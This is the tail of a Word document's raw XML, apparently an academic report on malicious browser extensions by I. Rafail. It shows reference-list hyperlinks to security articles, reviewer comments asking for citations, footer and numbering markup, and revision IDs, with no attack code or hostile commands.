          </w:rPr>
          <w:t>an</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>in</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>depth</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>look</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>into</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>malicious</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>browser</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>extensions</w:t>
        </w:r>
        <w:r w:rsidR="006D65D3" w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6F0C80E7" w14:textId="77777777" w:rsidR="00D77595" w:rsidRPr="005B5B30" w:rsidRDefault="00D77595" w:rsidP="00D77595">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">"Catch-All" Google Chrome Malicious Extension Steals All Posted Data. </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:history="1">
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>://</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>isc</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>sans</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>edu</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>forums</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>diary</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>CatchAll</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>+</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Google</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>+</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Chrome</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>+</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Malicious</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>+</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Extension</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>+</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Steals</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>+</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>All</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>+</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Posted</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>+</w:t>
        </w:r>
        <w:r w:rsidRPr="006D65D3">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Data</w:t>
        </w:r>
        <w:r w:rsidRPr="005B5B30">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>/22976/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4DBA1308" w14:textId="47F2AC80" w:rsidR="00D77595" w:rsidRPr="006D65D3" w:rsidRDefault="00737212" w:rsidP="00737212">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00EE6671">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Exploiting Chrome Attacks to Educate Staff.</w:t>
      </w:r>
      <w:r w:rsidR="006D65D3">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:history="1">
        <w:r w:rsidR="006D65D3" w:rsidRPr="00B63636">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://theantisocialengineer.com/2017/07/16/exploiting-chrome-attacks-to-educate-staff/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7678F025" w14:textId="77777777" w:rsidR="00737212" w:rsidRPr="00EE6671" w:rsidRDefault="00737212" w:rsidP="00737212">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="360"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18A1BE45" w14:textId="77777777" w:rsidR="00765439" w:rsidRPr="00EE6671" w:rsidRDefault="00765439" w:rsidP="00957C2E">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="100D163D" w14:textId="77777777" w:rsidR="00957C2E" w:rsidRPr="00F97466" w:rsidRDefault="00957C2E" w:rsidP="00957C2E">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00957C2E" w:rsidRPr="00F97466" w:rsidSect="00DF7906">
      <w:headerReference w:type="default" r:id="rId27"/>
      <w:footerReference w:type="default" r:id="rId28"/>
      <w:pgSz w:w="11907" w:h="16840" w:code="9"/>
      <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1134" w:header="709" w:footer="709" w:gutter="284"/>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8" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:40:00Z" w:initials="DM">
    <w:p w14:paraId="5FFF4496" w14:textId="48FE5469" w:rsidR="00E75476" w:rsidRDefault="00E75476">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Citation for CSP needed.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="106" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:40:00Z" w:initials="DM">
    <w:p w14:paraId="4ED54634" w14:textId="507D762D" w:rsidR="00544BB6" w:rsidRDefault="00544BB6">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Citation?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F82382" w14:textId="77777777" w:rsidR="00F25343" w:rsidRDefault="00F25343" w:rsidP="009747DC">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="00E93E73" w14:textId="77777777" w:rsidR="00F25343" w:rsidRDefault="00F25343" w:rsidP="00974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4D"/>
    <w:family w:val="roman"/>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2F1C4A" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00576F3D" w:rsidRDefault="006A6E3D" w:rsidP="00251371">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:rPr>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t>I. Rafail</w:t>
    </w:r>
    <w:r>
      <w:tab/>
    </w:r>
    <w:r>
      <w:tab/>
    </w:r>
    <w:r>
      <w:tab/>
    </w:r>
    <w:r w:rsidRPr="00523C30">
      <w:rPr>
        <w:sz w:val="16"/>
        <w:szCs w:val="20"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidRPr="00523C30">
      <w:rPr>
        <w:sz w:val="16"/>
        <w:szCs w:val="20"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r w:rsidRPr="00523C30">
      <w:rPr>
        <w:sz w:val="16"/>
        <w:szCs w:val="20"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00683412">
      <w:rPr>
        <w:noProof/>
        <w:sz w:val="16"/>
        <w:szCs w:val="20"/>
      </w:rPr>
      <w:t>32</w:t>
    </w:r>
    <w:r w:rsidRPr="00523C30">
      <w:rPr>
        <w:sz w:val="16"/>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9AF0C6" w14:textId="77777777" w:rsidR="00F25343" w:rsidRDefault="00F25343" w:rsidP="009747DC">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="674BD09F" w14:textId="77777777" w:rsidR="00F25343" w:rsidRDefault="00F25343" w:rsidP="009747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4E9A7" w14:textId="7EFEE0E9" w:rsidR="006A6E3D" w:rsidRPr="00724A19" w:rsidRDefault="006A6E3D" w:rsidP="00251371">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:rPr>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:sz w:val="16"/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t>Malicious Browser Extensions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462C4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="83AA9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C1807"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4400121E"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="360" w:hanging="360"/>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6391"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1A394460"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B798E4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CA7AC9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A3FCA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185A58"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4BE03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B4338B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2C8C4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6349BB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BFD25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FB3D3C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C7D6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6C2115"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F5184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B643B44"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E014FE3A"/>
    <w:lvl w:ilvl="0" w:tplc="72B28E0E">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="[%1]"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:i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nsid w:val="3E964C59"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="537C3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E72C1F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B8FE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963413"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C368267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Verdana"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Verdan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Verdan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63B565EA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0888B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802F11"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A336B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B10805"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AF083D56"/>
    <w:lvl w:ilvl="0" w:tplc="D8F6FE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5A047C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FAC049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74320198"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BCC097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C8145B5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A4ECA54A"/>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lang w:val="en-US"/>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7E4D1B22"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4B323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8"/>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2"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="23">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trackRevisions/>
  <w:defaultTabStop w:val="567"/>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C6C"/>
    <w:rsid w:val="00000CEF"/>
    <w:rsid w:val="000012E9"/>
    <w:rsid w:val="00002889"/>
    <w:rsid w:val="00013F0B"/>
    <w:rsid w:val="0003027E"/>
    <w:rsid w:val="0003206F"/>
    <w:rsid w:val="000405A6"/>
    <w:rsid w:val="00040BFD"/>
    <w:rsid w:val="00044D1F"/>
    <w:rsid w:val="00045271"/>
    <w:rsid w:val="00046672"/>
    <w:rsid w:val="000528E0"/>
    <w:rsid w:val="0005492B"/>
    <w:rsid w:val="00062DFE"/>
    <w:rsid w:val="00065856"/>
    <w:rsid w:val="00065D63"/>
    <w:rsid w:val="00067849"/>
    <w:rsid w:val="00067B98"/>
    <w:rsid w:val="00072DC0"/>
    <w:rsid w:val="000731D9"/>
    <w:rsid w:val="0007661A"/>
    <w:rsid w:val="000774E1"/>
    <w:rsid w:val="00080625"/>
    <w:rsid w:val="00081BFD"/>
    <w:rsid w:val="00082AB0"/>
    <w:rsid w:val="000848C9"/>
    <w:rsid w:val="000918EC"/>
    <w:rsid w:val="00091AAA"/>
    <w:rsid w:val="00092514"/>
    <w:rsid w:val="00092DF4"/>
    <w:rsid w:val="0009357B"/>
    <w:rsid w:val="0009390C"/>
    <w:rsid w:val="00094782"/>
    <w:rsid w:val="00096F39"/>
    <w:rsid w:val="00097F2F"/>
    <w:rsid w:val="000A239B"/>
    <w:rsid w:val="000A3438"/>
    <w:rsid w:val="000A3A9E"/>
    <w:rsid w:val="000A4236"/>
    <w:rsid w:val="000A5DF3"/>
    <w:rsid w:val="000A6BCB"/>
    <w:rsid w:val="000B0C2E"/>
    <w:rsid w:val="000C0A43"/>
    <w:rsid w:val="000C0FBB"/>
    <w:rsid w:val="000C2728"/>
    <w:rsid w:val="000C35CE"/>
    <w:rsid w:val="000C4013"/>
    <w:rsid w:val="000C4765"/>
    <w:rsid w:val="000D3AD9"/>
    <w:rsid w:val="000E2F70"/>
    <w:rsid w:val="000E394E"/>
    <w:rsid w:val="000E3A70"/>
    <w:rsid w:val="000E4D2B"/>
    <w:rsid w:val="000E5489"/>
    <w:rsid w:val="000E5531"/>
    <w:rsid w:val="000F0643"/>
    <w:rsid w:val="000F1141"/>
    <w:rsid w:val="000F40C2"/>
    <w:rsid w:val="000F641D"/>
    <w:rsid w:val="000F6760"/>
    <w:rsid w:val="000F7621"/>
    <w:rsid w:val="00103DE2"/>
    <w:rsid w:val="00104318"/>
    <w:rsid w:val="00105FDF"/>
    <w:rsid w:val="001117FC"/>
    <w:rsid w:val="001125E4"/>
    <w:rsid w:val="00113A9A"/>
    <w:rsid w:val="001175B2"/>
    <w:rsid w:val="0011765B"/>
    <w:rsid w:val="00135665"/>
    <w:rsid w:val="0014551D"/>
    <w:rsid w:val="00147EC7"/>
    <w:rsid w:val="00151913"/>
    <w:rsid w:val="00151FD5"/>
    <w:rsid w:val="00152D96"/>
    <w:rsid w:val="001530FC"/>
    <w:rsid w:val="00161EE7"/>
    <w:rsid w:val="00163A42"/>
    <w:rsid w:val="00165B67"/>
    <w:rsid w:val="001670A3"/>
    <w:rsid w:val="00167628"/>
    <w:rsid w:val="001677EB"/>
    <w:rsid w:val="0017020F"/>
    <w:rsid w:val="001706AD"/>
    <w:rsid w:val="0017160F"/>
    <w:rsid w:val="00171D4C"/>
    <w:rsid w:val="00172AEF"/>
    <w:rsid w:val="001752C7"/>
    <w:rsid w:val="001757CF"/>
    <w:rsid w:val="00180DF6"/>
    <w:rsid w:val="001830FB"/>
    <w:rsid w:val="00186F7F"/>
    <w:rsid w:val="00194CB6"/>
    <w:rsid w:val="00194DEF"/>
    <w:rsid w:val="00195524"/>
    <w:rsid w:val="0019558C"/>
    <w:rsid w:val="00196BBE"/>
    <w:rsid w:val="001A1389"/>
    <w:rsid w:val="001A204D"/>
    <w:rsid w:val="001A20D5"/>
    <w:rsid w:val="001A34CC"/>
    <w:rsid w:val="001A3553"/>
    <w:rsid w:val="001A3AAB"/>
    <w:rsid w:val="001A3C57"/>
    <w:rsid w:val="001A44EE"/>
    <w:rsid w:val="001A5E29"/>
    <w:rsid w:val="001A7557"/>
    <w:rsid w:val="001A77E4"/>
    <w:rsid w:val="001B0156"/>
    <w:rsid w:val="001B1328"/>
    <w:rsid w:val="001B1759"/>
    <w:rsid w:val="001B2103"/>
    <w:rsid w:val="001B3CBD"/>
    <w:rsid w:val="001B578A"/>
    <w:rsid w:val="001C1E3B"/>
    <w:rsid w:val="001C1F7E"/>
    <w:rsid w:val="001C3329"/>
    <w:rsid w:val="001C49AF"/>
    <w:rsid w:val="001C73D5"/>
    <w:rsid w:val="001C7838"/>
    <w:rsid w:val="001D2830"/>
    <w:rsid w:val="001D3231"/>
    <w:rsid w:val="001D4123"/>
    <w:rsid w:val="001D5415"/>
    <w:rsid w:val="001D62EE"/>
    <w:rsid w:val="001D7432"/>
    <w:rsid w:val="001D7A35"/>
    <w:rsid w:val="001E0CF4"/>
    <w:rsid w:val="001E6BCB"/>
    <w:rsid w:val="001F0BC9"/>
    <w:rsid w:val="001F0EA6"/>
    <w:rsid w:val="001F0F93"/>
    <w:rsid w:val="001F5033"/>
    <w:rsid w:val="001F5872"/>
    <w:rsid w:val="001F6550"/>
    <w:rsid w:val="001F6BF2"/>
    <w:rsid w:val="001F71C8"/>
    <w:rsid w:val="001F7863"/>
    <w:rsid w:val="001F7F0C"/>
    <w:rsid w:val="00200883"/>
    <w:rsid w:val="00200A05"/>
    <w:rsid w:val="00205102"/>
    <w:rsid w:val="002067FA"/>
    <w:rsid w:val="0020786A"/>
    <w:rsid w:val="00210431"/>
    <w:rsid w:val="00213E18"/>
    <w:rsid w:val="00214356"/>
    <w:rsid w:val="00215036"/>
    <w:rsid w:val="00215755"/>
    <w:rsid w:val="002173CA"/>
    <w:rsid w:val="00220BD9"/>
    <w:rsid w:val="002228BF"/>
    <w:rsid w:val="00224152"/>
    <w:rsid w:val="00234138"/>
    <w:rsid w:val="00235290"/>
    <w:rsid w:val="00236295"/>
    <w:rsid w:val="00240F05"/>
    <w:rsid w:val="00243778"/>
    <w:rsid w:val="002458C5"/>
    <w:rsid w:val="00247181"/>
    <w:rsid w:val="00247734"/>
    <w:rsid w:val="00251371"/>
    <w:rsid w:val="002522AF"/>
    <w:rsid w:val="002531E8"/>
    <w:rsid w:val="00255A90"/>
    <w:rsid w:val="00255E9A"/>
    <w:rsid w:val="00257A2C"/>
    <w:rsid w:val="00260906"/>
    <w:rsid w:val="002630A8"/>
    <w:rsid w:val="00264F63"/>
    <w:rsid w:val="002658FC"/>
    <w:rsid w:val="00267F27"/>
    <w:rsid w:val="002725BB"/>
    <w:rsid w:val="00273F9C"/>
    <w:rsid w:val="0027663B"/>
    <w:rsid w:val="00285641"/>
    <w:rsid w:val="002869A6"/>
    <w:rsid w:val="00287263"/>
    <w:rsid w:val="00290B03"/>
    <w:rsid w:val="002917FD"/>
    <w:rsid w:val="00292350"/>
    <w:rsid w:val="002954B8"/>
    <w:rsid w:val="00295C39"/>
    <w:rsid w:val="002967CB"/>
    <w:rsid w:val="002A7B53"/>
    <w:rsid w:val="002B3B20"/>
    <w:rsid w:val="002B6F86"/>
    <w:rsid w:val="002B7846"/>
    <w:rsid w:val="002C0CF9"/>
    <w:rsid w:val="002C4A15"/>
    <w:rsid w:val="002C60EC"/>
    <w:rsid w:val="002C67EC"/>
    <w:rsid w:val="002C76E0"/>
    <w:rsid w:val="002C7FED"/>
    <w:rsid w:val="002D0273"/>
    <w:rsid w:val="002D15C4"/>
    <w:rsid w:val="002D25DE"/>
    <w:rsid w:val="002D2B00"/>
    <w:rsid w:val="002D335C"/>
    <w:rsid w:val="002E57A4"/>
    <w:rsid w:val="002E5E96"/>
    <w:rsid w:val="002E6F36"/>
    <w:rsid w:val="002F1C08"/>
    <w:rsid w:val="002F6172"/>
    <w:rsid w:val="002F6DD5"/>
    <w:rsid w:val="002F71E3"/>
    <w:rsid w:val="003008FB"/>
    <w:rsid w:val="0030246A"/>
    <w:rsid w:val="00305720"/>
    <w:rsid w:val="00314743"/>
    <w:rsid w:val="00314771"/>
    <w:rsid w:val="00320722"/>
    <w:rsid w:val="00321292"/>
    <w:rsid w:val="00321792"/>
    <w:rsid w:val="003260CD"/>
    <w:rsid w:val="00327E1E"/>
    <w:rsid w:val="00331472"/>
    <w:rsid w:val="00331910"/>
    <w:rsid w:val="003327FB"/>
    <w:rsid w:val="00332D89"/>
    <w:rsid w:val="00333821"/>
    <w:rsid w:val="00334F3E"/>
    <w:rsid w:val="003459DA"/>
    <w:rsid w:val="003505B8"/>
    <w:rsid w:val="003512B7"/>
    <w:rsid w:val="003516C1"/>
    <w:rsid w:val="00352284"/>
    <w:rsid w:val="0035531C"/>
    <w:rsid w:val="00356FB8"/>
    <w:rsid w:val="0036629B"/>
    <w:rsid w:val="00370AEB"/>
    <w:rsid w:val="00371FAE"/>
    <w:rsid w:val="00372EBF"/>
    <w:rsid w:val="00374AB8"/>
    <w:rsid w:val="0037749B"/>
    <w:rsid w:val="00380BAD"/>
    <w:rsid w:val="003827D2"/>
    <w:rsid w:val="003842B7"/>
    <w:rsid w:val="00384C6C"/>
    <w:rsid w:val="00392528"/>
    <w:rsid w:val="00392CE1"/>
    <w:rsid w:val="003A1147"/>
    <w:rsid w:val="003A6241"/>
    <w:rsid w:val="003A7B5E"/>
    <w:rsid w:val="003B0BB2"/>
    <w:rsid w:val="003B1375"/>
    <w:rsid w:val="003B26D0"/>
    <w:rsid w:val="003B778F"/>
    <w:rsid w:val="003C176C"/>
    <w:rsid w:val="003D029B"/>
    <w:rsid w:val="003D03DA"/>
    <w:rsid w:val="003D04EB"/>
    <w:rsid w:val="003D0D76"/>
    <w:rsid w:val="003D2584"/>
    <w:rsid w:val="003D56D5"/>
    <w:rsid w:val="003D7E7C"/>
    <w:rsid w:val="003E69B6"/>
    <w:rsid w:val="003E6EA4"/>
    <w:rsid w:val="003F0CC3"/>
    <w:rsid w:val="003F78BD"/>
    <w:rsid w:val="00400700"/>
    <w:rsid w:val="00406B8F"/>
    <w:rsid w:val="004075D9"/>
    <w:rsid w:val="00414333"/>
    <w:rsid w:val="00420957"/>
